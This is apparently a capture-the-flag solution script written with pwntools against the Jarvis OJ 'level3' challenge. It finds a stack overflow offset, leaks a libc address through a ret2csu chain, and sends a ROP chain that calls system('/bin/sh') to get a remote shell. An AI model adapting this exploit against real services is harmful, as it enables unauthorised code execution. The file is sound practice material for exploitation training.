from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']


class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        if binary_file:
            self.binary_file = binary_file
            self.elf = ELF(self.binary_file)
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']


    def get_overflow_position(self):
        io = self.get_io(False)
        io.recvline()
        io.send(cyclic(600))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.rip = cyclic_find(core.u32(core.rsp))
            print 'rip:', hex(self.rip)


    def get_io(self, remote_sign=False):
        io = None
        if remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process(self.binary_file)
        return io

    
    def get_shell(self):
        io = self.get_io(True)
        io.recvline()
        libc = ELF('libc.so')
        write_plt = libc.symbols['write']
        write_got = self.elf.got['write']
        
        pop_multi_addr = 0x4006AA
        call_addr = 0x400690
        payload = 'a' * self.rip 
        payload += p64(pop_multi_addr) + p64(0) + p64(1) + p64(write_got)
        payload += p64(8) + p64(write_got) + p64(1)
        payload += p64(call_addr)
        payload += 'a' * 56
        payload += p64(self.elf.symbols['main'])
        io.send(payload)

        write_got_addr = io.unpack()
        print "write_got_addr:", hex(write_got_addr)

        io.recvline()
        libc.address = write_got_addr - write_plt
        bin_addr = libc.search('/bin/sh\x00').next()
        rop = ROP(libc)
        rop.system(bin_addr)
        io.send(fit({self.rip:rop.chain()}))
        io.interactive()


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9883}, binary_file='./level3')
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()

